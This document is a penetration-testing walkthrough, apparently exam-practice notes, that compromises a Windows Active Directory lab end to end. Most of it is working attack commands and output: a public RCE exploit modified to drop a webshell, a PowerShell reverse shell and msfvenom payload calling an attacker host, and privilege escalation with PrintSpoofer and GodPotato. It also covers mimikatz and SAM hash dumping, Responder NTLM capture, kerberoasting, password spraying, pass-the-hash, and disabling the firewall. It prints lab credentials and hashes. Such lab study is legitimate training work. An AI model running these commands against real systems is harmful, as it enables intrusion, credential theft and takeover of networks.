# HTTP/80

Boring Website, mybe some usernames

Check URLs:
- `robots.txt` - nope
- `sitemap.xml` - nope

## Nikto

```
nikto --url http://192.168.231.141
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.231.141
+ Target Hostname:    192.168.231.141
+ Target Port:        80
+ Start Time:         2025-10-28 21:02:47 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Win64) PHP/7.4.26
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/7.4.26 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8908 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-10-28 21:07:45 (GMT1) (298 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Searchsploit Nicepage

```
searchsploit Nicepage 4.8.2                                                      
Exploits: No Results
Shellcodes: No Results

searchsploit Nicepage      
Exploits: No Results
Shellcodes: No Results
```

## gobuster

```bash
gobuster dir -u http://192.168.231.141 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 6651]
/cgi-bin/             (Status: 403) [Size: 290]
/blog/                (Status: 200) [Size: 2237]
/script/              (Status: 200) [Size: 1210]
/phpmyadmin/          (Status: 403) [Size: 290]
/icons/               (Status: 200) [Size: 74798]
/phpsysinfo/          (Status: 403) [Size: 290]
/con/                 (Status: 403) [Size: 290]
/aux/                 (Status: 403) [Size: 290]
/adminer/             (Status: 403) [Size: 290]
/error_log/          (Status: 403) [Size: 290]
/prn/                 (Status: 403) [Size: 290]
```
`/blog/` just some lorem ipsum blog entries.. => mybe local file inclusion? => unlikely

---
# HTTP/81

## gobuster

```bash
gobuster dir -u http://192.168.231.141:81/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.141:81/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 290]
/images/              (Status: 200) [Size: 1422]
/admin/               (Status: 200) [Size: 8188]
/scripts/             (Status: 200) [Size: 269]
/plugins/             (Status: 200) [Size: 2478]
/db/                  (Status: 200) [Size: 969]
/index/               (Status: 200) [Size: 4280]
/phpmyadmin/          (Status: 403) [Size: 290]
/icons/               (Status: 200) [Size: 74798]
/header/              (Status: 200) [Size: 1377]
/build/               (Status: 200) [Size: 1600]
/dist/                (Status: 200) [Size: 1377]
/conn/                (Status: 200) [Size: 1655]
/tcpdf/               (Status: 200) [Size: 2716]
/phpsysinfo/          (Status: 403) [Size: 290]
/con/                 (Status: 403) [Size: 290]
/aux/                 (Status: 403) [Size: 290]
/adminer/             (Status: 403) [Size: 290]
/error_log/          (Status: 403) [Size: 290]
/prn/                 (Status: 403) [Size: 290]
Progress: 26583 / 26583 (100.00%)
===============================================================
Finished
===============================================================
```

## SQLi

SQLi in login form:
![[Pasted image 20251028212310.png]]
Local webroot disclosed: `C:\wamp64\attendance\conn.php`

SQLi in `/admin/login.php`
![[Pasted image 20251028213321.png]]

There is a SQL file under /db/:
![[Pasted image 20251028213516.png]]

```bash
cat apsystem.sql

# ...
# Database: `apsystem`
# ...
# INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
# (1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
# ...
```
=> creds: `nurhodelta:$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK`

## Hash cracking

Google: Hash is a bcrypt hash. Manpage for hashcat shows mode 3200
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
# $2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK:password
```
=> PW: password

Creds dont work for the admin login `http://192.168.237.141:81/admin/index.php`

## The intended way? :)
## Exploits for HTTP/81

Search exploit:
```bash
searchsploit Attendance and Payroll System                                                                                                                        
# Attendance and Payroll System v1.0 - Remote Code Execution (RCE) | php/webapps/50801.py
# Attendance and Payroll System v1.0 - SQLi Authentication Bypass  | php/webapps/50802.py

searchsploit -m 50801
```

Modify exploit, adapt paths:
```bash
# before
#upload_path = '/apsystem/admin/employee_edit_photo.php'
#shell_path = '/apsystem/images/shell.php'

# after
upload_path = '/admin/employee_edit_photo.php'
shell_path = '/images/shell.php'
```

Execute exploit:
```bash
python3 50801.py http://192.168.237.141:81

#     >> Attendance and Payroll System v1.0
#     >> Unauthenticated Remote Code Execution
#     >> By pr0z

# [*] Uploading the web shell to http://192.168.237.141:81
# [*] Validating the shell has been uploaded to http://192.168.237.141:81
# [✓] Successfully connected to web shell

RCE > whoami
ms01\mary.williams

RCE > 
```
BINGO!

Edit exploit to spawn a reverse shell instead of a webshell.
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.250",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```
Modify exploit:
```php
shell_data = '<?php exec("powershell -nop -w hidden -e <base64-string>"); ?>'
```
BINGO!

## File Transfer

Run SMB server on attacker:
```bash
impacket-smbserver myshare ./myshare -username haxxor -password pass123 -smb2support
```

On Windows host:
```PowerShell
net use \\192.168.45.250\myshare pass123 /user:haxxor
Copy-Item -Path 'wampmanager.ini' -Destination '\\192.168.45.250\myshare\wampmanager.ini'
```

---
# MySQL

Try creds on mysql:
```bash
mysql -h 192.168.231.141 -P 3306 -u "nurhodelta" -p                          
# Enter password: 
# ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.192' is not allowed to connect to this MySQL server

mysql -h 192.168.231.141 -P 3307 -u "nurhodelta" -p                              
# Enter password: 
# ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.192' is not allowed to connect to this MariaDB server
```
=> Cant connect from kali.

## Ligolo - port forward MySQL

Setup ligolo tunnel so we can access ports 3306,3307 as well as enumerate the 
try user "nurhodelta", mybe we find more info in db

Ligolo:
```powershell
# Download
iwr -uri http://192.168.45.250/ligolo-agent.exe -Outfile ligolo-agent.exe

.\ligolo-agent.exe -connect 192.168.45.250:11601 -ignore-cert
tunnel_start --tun "ligolo"
ifconfig
# CIDR last octet must be 0. Example: 192.168.20.0/24
sudo ip route add 10.10.197.0/24 dev "ligolo"
# Setup route to access localhost
sudo ip route add 240.0.0.1/32 dev ligolo
```
DONE!

Test MySQL access:
```bash
# As Anonymous
mysql -h 240.0.0.1 -P 3306 --user=anonymous
mysql -h 240.0.0.1 -P 3307 -u "" -p
mysql -h 240.0.0.1 -P 3307 -u "guest" -p
# nope

# With creds (PW: password)
mysql -h 240.0.0.1 -P 3306 -u "nurhodelta" -p apsystem --skip-ssl-verify-server-cert
mysql -h 240.0.0.1 -P 3307 -u "nurhodelta" -p --skip-ssl-verify-server-cert
# access denied
```

Access port 3307 as "root":
```bash
mysql -h 240.0.0.1 -P 3307 -u "root" -p --skip-ssl-verify-server-cert                                                                                                                                                               1 ↵
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.6.5-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.033 sec)
```
=> no interesting database

# SMB

Shares
```bash
netexec smb 192.168.231.141 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares                                                                                                                                                   130 ↵
SMB         192.168.231.141 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False) 
SMB         192.168.231.141 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         192.168.231.141 445    MS01             [*] Enumerated shares
SMB         192.168.231.141 445    MS01             Share           Permissions     Remark
SMB         192.168.231.141 445    MS01             -----           -----------     ------
SMB         192.168.231.141 445    MS01             ADMIN$                          Remote Admin
SMB         192.168.231.141 445    MS01             C$                              Default share
SMB         192.168.231.141 445    MS01             IPC$            READ            Remote IPC
SMB         192.168.231.141 445    MS01             setup           READ 
```

Share `setup`:
```bash
smbclient \\\\192.168.231.141\\setup -U 'oscp.exam\Eric.Wallows'%'EricLikesRunning800'
```
=> nothing interesting

---
# Evil-WinRM (THE NOT INTENDED WAY)

Connect with given creds:
```bash
evil-winrm -i 192.168.231.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

Users:
```powershell
ls

Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2022   1:08 PM                Administrator
d-----        11/10/2022   2:06 AM                Administrator.OSCP
d-----          4/1/2022   9:30 AM                celia.almeda
d-----        10/28/2025   1:52 PM                eric.wallows
d-----          4/1/2022   7:56 AM                Mary.Williams
d-r---        11/18/2020  11:48 PM                Public
d-----         12/5/2022   5:47 AM                support
d-----        11/13/2022  11:23 PM                web_svc


*Evil-WinRM* PS C:\Users> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Mary.Williams            support                  WDAGUtilityAccount
The command completed with one or more errors.
```

whoami:
```powershell
C:\Users\eric.wallows\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7605


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
=> SeImpersonatePrivilege

Upload PrintSpoofer64 and nc64 for reverse shell:
```powershell
.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.192 4444 -e cmd"
```
BINGO!!!

SYSTEM shell:
```bash
nc -vlnp 4444                
listening on [any] 4444 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.231.141] 62914
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Add eric as local admin:
```powershell
net localgroup Administrators oscp\eric.wallows /add
```

Enable RDP:
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

# Disable Firewall
netsh advfirewall set allprofiles state off
```

Connect via RDP
```bash
xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:192.168.231.141 /cert:ignore +clipboard /dynamic-resolution
```
=> Message: OSCP\celia.almeda was connected

## Credentials search as administrator

```powershell
Get-ChildItem -Path "C:\Users" -Recurse -File -Force -ErrorAction SilentlyContinue |
Where-Object { $_.Extension -match '\.(xml|json|ini|txt|config|bak)$' } |
Select-String -Pattern 'password', 'pass', 'passwd', 'pwd', 'credentials', 'auth', 'authentication', 'apikey', 'api_key', 'secret', 'token' -CaseSensitive:$false -ErrorAction SilentlyContinue |
Select-Object Path, Line
```
=> didnt find anything interesting

## Mimikatz

Download mimi:
```powershell
iwr -uri http://192.168.45.192/mimikatz.exe -Outfile mimikatz.exe
```

Mimi results:
```
Logoncredentials:
* Username : MS01$
* Domain   : OSCP
* NTLM     : 8bcc4b2113f3f09b019d3ae382d908b9

* Username : celia.almeda
* Domain   : OSCP
* NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
  
* Username : Mary.Williams
* Domain   : MS01
* NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
  
MS01 SAM:

User : Administrator
Hash NTLM: 3c4495bbd678fac8c9d218be4f2bbc7b

User : support
Hash NTLM: d9358122015c5b159574a88b3c0d2071
```

---
# Enum services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# ...
# wampapache64           Running "c:\wamp64\bin\apache\apache2.4.51\bin\httpd.exe" -k runservice                  
# wampmariadb64          Running "c:\wamp64\bin\mariadb\mariadb10.6.5\bin\mysqld.exe" "wampmariadb64"
# wampmysqld64           Running c:\wamp64\bin\mysql\mysql5.7.36\bin\mysqld.exe wampmysqld64
# ...
```

Info about a service:
```Powershell
$serviceName = "wampapache64"
Get-CimInstance -ClassName Win32_Service -Filter "Name = '$serviceName'" | Format-List *

$serviceName = "wampmariadb64"
Get-CimInstance -ClassName Win32_Service -Filter "Name = '$serviceName'" | Format-List *

$serviceName = "wampmysqld64"
Get-CimInstance -ClassName Win32_Service -Filter "Name = '$serviceName'" | Format-List *
```
=> All have `StartName: .\Mary.Williams` which means the services are running as that account, as expected. => not vulnerable

# PowerUp

```Powershell
iwr -uri http://192.168.45.250/PowerUp.ps1 -Outfile PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
```
=> nothing

# WinPEAS

```Powershell
iwr -uri http://192.168.45.250/winPEAS.ps1 -Outfile winPEAS.ps1
.\winPEAS.ps1
```

```powershell 
#  Identity BUILTIN\Users BUILTIN\Users has 'Write' perms for C:\ProgramData

# SSH config:
# Match Group administrators
#        AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys

# => not exploitable, since ssh folder already exists
```

# Responder - NTLM Auth 

```bash
sudo responder -I tun0 -v
```

As Mary run:
```Powershell
Invoke-Expression "\\192.168.45.250\SHARE"
```

Result:
```
[SMB] NTLMv2-SSP Client   : 192.168.237.141
[SMB] NTLMv2-SSP Username : MS01\Mary.Williams
[SMB] NTLMv2-SSP Hash     : Mary.Williams::MS01:a24c33bf4c3ab6c0:FBB2D08F31E0BAEA6ED5B43F7082EBF4:010100000000000080496DC8124CDC01683D491F051559E10000000002000800480035004200590001001E00570049004E002D005600560031004F0049004A004D00410047004C00550004003400570049004E002D005600560031004F0049004A004D00410047004C0055002E0048003500420059002E004C004F00430041004C000300140048003500420059002E004C004F00430041004C000500140048003500420059002E004C004F00430041004C000700080080496DC8124CDC0106000400020000000800300030000000000000000000000000300000A3345CDA12C0AA6E40E9354E97D58688521AADF1F366CA264B2DAC2427BA4C600A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200350030000000000000000000
```

Cracking NTLMv2 Hash:
```bash
hashcat -m 5600 mary_ntlmv2.hash /usr/share/wordlists/rockyou.txt
```
=> no luck

## File search (again?)

```Powershell
Get-ChildItem -Path "C:\Users\Mary.Williams\" -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
# nothing

Get-ChildItem -Path "C:\Users\Mary.Williams\" -Recurse -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(xml|json|ini|txt|config|bak)$' } | Select-String -Pattern 'password','pass','passwd','pwd','credentials','auth','authentication', 'apikey','api_key','secret','token' -CaseSensitive:$false -ErrorAction SilentlyContinue | Format-Table -AutoSize
# nothing
```

## SeImpersonatePrivilege

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

Download GodPotato:
```Powershell
iwr -uri http://192.168.45.250/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
```

Execute:
```Powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```
=> cant create process

Try to create a scheduled task that runs a rev shell:
Create reverse shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=7777 -f exe -o rshell7777.exe
```

```Powershell
# Download rshell7777.exe
iwr -uri http://192.168.45.250/rshell7777.exe -Outfile rshell7777.exe

# Create a scheduled task "revshell7777" that runs the rev shell
.\GodPotato-NET4.exe -cmd "schtasks /create /tn revshell7777 /tr C:\Users\Mary.Williams\rshell7777.exe /sc once /st 00:00 /ru SYSTEM"
# Run scheduled task/reverse shell
.\GodPotato-NET4.exe -cmd "schtasks /run /tn revshell7777"
# Cleanup: delete task
.\GodPotato-NET4.exe -cmd "schtasks /delete /tn revshell7777 /f"
```
BINGO!!!
btw: PrintSpoofer64 exploit would have also worked.

We got a system shell: 
```bash
nc -vlnp 7777                                                                                     
listening on [any] 7777 ...
connect to [192.168.45.250] from (UNKNOWN) [192.168.237.141] 62496
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami      
whoami
nt authority\system
```

Next: Dump creds via mimikatz, enable RDP, etc.
=> See above: THE NOT INTENDED WAY

Cleanup: delete task
```Powershell
.\GodPotato-NET4.exe -cmd "schtasks /delete /tn revshell7777 /f"
```

---
# Lateral Movement

## Nmap

Scan the internal hosts:
```bash
# DC01
sudo nmap -v -Pn -p- -T4 -oN dc01_tcp_ports.nmap 10.10.197.140
sudo nmap -v -Pn -p $(cat dc01_tcp_ports.nmap | grep -Eo '([0-9]{1,5})/tcp' | awk -F '/' '{print $1}' | paste -sd ',') -sV -sC -oN dc01_tcp_services.nmap 10.10.197.140

# MS02
sudo nmap -v -Pn -p- -T4 -oN ms02_tcp_ports.nmap 10.10.197.142
sudo nmap -v -Pn -p $(cat ms02_tcp_ports.nmap | grep -Eo '([0-9]{1,5})/tcp' | awk -F '/' '{print $1}' | paste -sd ',') -sV -sC -oN ms02_tcp_services.nmap 10.10.197.142
```

## AD user enum

Enumerate User Description:
```bash
netexec ldap 10.10.197.140 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users
```
=> nothing

Get users:
```bash
impacket-GetADUsers -all -dc-ip 10.10.197.140 'oscp.exam/Eric.Wallows':'EricLikesRunning800'
```
=> Add to `ad_users.txt` except eric, krbtgt and Guest

## BloodHound

Collect AD data:
```bash
sudo bloodhound-ce-python -d 'oscp.exam' -dc 'dc01.oscp.exam' -ns 10.10.197.140 -u 'Eric.Wallows' -p 'EricLikesRunning800' -c all
```

Run BloodHound:
```bash
# Start BloodHound
cd ~/Hacking/tools/BloodHound-CE
docker-compose up -d

firefox http://127.0.0.1:8080
# admin
# 4;xQpM}&s6P:D5=4

# (Optional) Clear old data first: Administration -> Database Management
# Import collected data (Upload files)

# Stop containers
docker-compose down
```

Domain Admins:
```
TOM_ADMIN@OSCP.EXAM
```

## Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.197.140 'oscp.exam/Eric.Wallows':'EricLikesRunning800'
```

Results:
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.oscp.exam  sql_svc            2022-12-05 14:49:44.637096  2022-11-10 12:15:51.783016             
HTTP/MS01.oscp.exam   web_svc            2022-11-11 08:11:19.795439  2022-11-14 15:29:47.826775             

...
```
=> 2 SPN: `MSSQL/MS02.oscp.exam`, `HTTP/MS01.oscp.exam`

Crack the hashes:
```bash
hashcat -m 13100 SPN_hashes.txt /usr/share/wordlists/rockyou.txt
```
=> `web_svc:Diamond1`

## Password Spraying

Check for password reuse of web_svc's pw `Diamond1`:
```bash
netexec smb 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# SMB         192.168.237.141 445    MS01             [+] oscp.exam\web_svc:Diamond1
# SMB         10.10.197.140   445    DC01             [+] oscp.exam\web_svc:Diamond1
# SMB         10.10.197.142   445    MS02             [+] oscp.exam\web_svc:Diamond1

netexec mssql 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# MSSQL       10.10.197.142   1433   MS02             [+] oscp.exam\web_svc:Diamond1

netexec winrm 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# nope

netexec ftp 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# no service

netexec ldap 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# LDAP        10.10.197.140   389    DC01             [+] oscp.exam\web_svc:Diamond1

netexec rdp 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# no service

netexec ssh 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# nope

netexec wmi 192.168.237.141 10.10.197.140 10.10.197.142 -u ad_users.txt -p 'Diamond1'
# RPC         192.168.237.141 135    MS01             [+] oscp.exam\web_svc:Diamond1
# RPC         10.10.197.142   135    MS02             [+] oscp.exam\web_svc:Diamond1 
# RPC         10.10.197.140   135    DC01             [+] oscp.exam\web_svc:Diamond1 
```

# SMB enum

```bash
netexec smb 192.168.237.141 10.10.197.140 10.10.197.142 -u 'oscp.exam\web_svc' -p 'Diamond1' --shares -M spider_plus
```

```
Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/192.168.237.141.json"
SMB         192.168.237.141 445    MS01             [*] Enumerated shares
SMB         192.168.237.141 445    MS01             Share           Permissions     Remark
SMB         192.168.237.141 445    MS01             -----           -----------     ------
SMB         192.168.237.141 445    MS01             ADMIN$                          Remote Admin
SMB         192.168.237.141 445    MS01             C$                              Default share
SMB         192.168.237.141 445    MS01             IPC$            READ            Remote IPC
SMB         192.168.237.141 445    MS01             setup           READ



Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.10.197.142.json"
SMB         10.10.197.142   445    MS02             Share           Permissions     Remark
SMB         10.10.197.142   445    MS02             -----           -----------     ------
SMB         10.10.197.142   445    MS02             ADMIN$                          Remote Admin
SMB         10.10.197.142   445    MS02             C$                              Default share
SMB         10.10.197.142   445    MS02             IPC$            READ            Remote IPC



Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.10.197.140.json"

SMB         10.10.197.140   445    DC01             Share           Permissions     Remark
SMB         10.10.197.140   445    DC01             -----           -----------     ------
SMB         10.10.197.140   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.197.140   445    DC01             C$                              Default share
SMB         10.10.197.140   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.197.140   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.197.140   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.197.140   445    DC01             Users           READ
```
=> nothing interesting (?)

## MSSQL

Connect:
```bash
impacket-mssqlclient 'OSCP/web_svc':'Diamond1'@10.10.197.142 -windows-auth
```
=> no databases, no file read or cmd exec permissions

**Coerce NTLM Authentication**
On Kali:
```bash
sudo responder -I tun0 -v
```
In the MSSQL DB:
```
EXECUTE MASTER.sys.xp_dirtree '\\192.168.45.250\test', 1, 1
```
=> no hashes captured.


# NTLM-Hash Spraying

`celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd`

```bash
netexec winrm 192.168.237.141 10.10.197.140 10.10.197.142 -u 'oscp.exam\celia.almeda' -H e728ecbadfb02f51ce8eed753f3ff3fd

# WINRM       10.10.197.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)

netexec mssql 192.168.237.141 10.10.197.140 10.10.197.142 -u 'oscp.exam\celia.almeda' -H e728ecbadfb02f51ce8eed753f3ff3fd
# MSSQL       10.10.197.142   1433   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 
```

## MSSQL

Connect:
```bash
impacket-mssqlclient 'celia.almeda'@10.10.197.142 -hashes :e728ecbadfb02f51ce8eed753f3ff3fd -windows-auth
```
=> no databases, no file read or cmd exec permissions
=> Coerce NTLM Authentication also fails

## WinRM

```bash
evil-winrm -i 10.10.197.142 -u 'oscp.exam\celia.almeda' -H e728ecbadfb02f51ce8eed753f3ff3fd
```

# SAM, SYSTEM files

Enumeration shows that there is the folder `C:\windows.old` which contains SAM and SYSTEM files we can read:
```powershell
icacls C:\windows.old\Windows\System32\SAM
C:\windows.old\Windows\System32\SAM NT AUTHORITY\Authenticated Users:(I)(M)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Users:(I)(RX)
                                    
icacls C:\windows.old\Windows\System32\SYSTEM
C:\windows.old\Windows\System32\SYSTEM NT AUTHORITY\Authenticated Users:(I)(M)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Users:(I)(RX)
```

Start SMB server on attacker and upload them:
Run SMB server on attacker:
```bash
impacket-smbserver myshare ./myshare -username haxxor -password pass123 -smb2support
```
Upload:
```powershell
net use \\192.168.45.250\myshare pass123 /user:haxxor

Copy-Item -Path 'C:\windows.old\Windows\System32\SAM' -Destination '\\192.168.45.250\myshare\SAM'

Copy-Item -Path 'C:\windows.old\Windows\System32\SYSTEM' -Destination '\\192.168.45.250\myshare\SYSTEM'
```
=> this fails because MS02 is in the internal network and cannot reach our attacker machine.

But there is even a simpler way with evil-winrm :)
```powershell
download "C:\windows.old\Windows\System32\SAM"
download "C:\windows.old\Windows\System32\SYSTEM"
```

Dump Hashes:
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
